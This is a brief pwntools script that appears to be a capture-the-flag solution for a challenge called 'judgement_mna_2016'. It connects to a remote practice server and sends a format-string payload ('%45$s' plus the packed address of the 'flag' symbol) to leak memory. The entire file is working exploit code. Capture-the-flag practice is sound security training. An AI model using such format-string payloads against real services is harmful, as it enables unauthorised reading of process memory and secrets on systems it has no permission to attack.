from pwn import *

elf = ELF('./judgement_mna_2016')
# io = process(['./judgement_mna_2016'])
io = remote('node5.buuoj.cn', 28122)

payload = b'%45$s  \x00' + packing.p32(elf.symbols['flag'])

io.sendlineafter(b'Flag judgment system\nInput flag >> ', payload)
io.interactive()
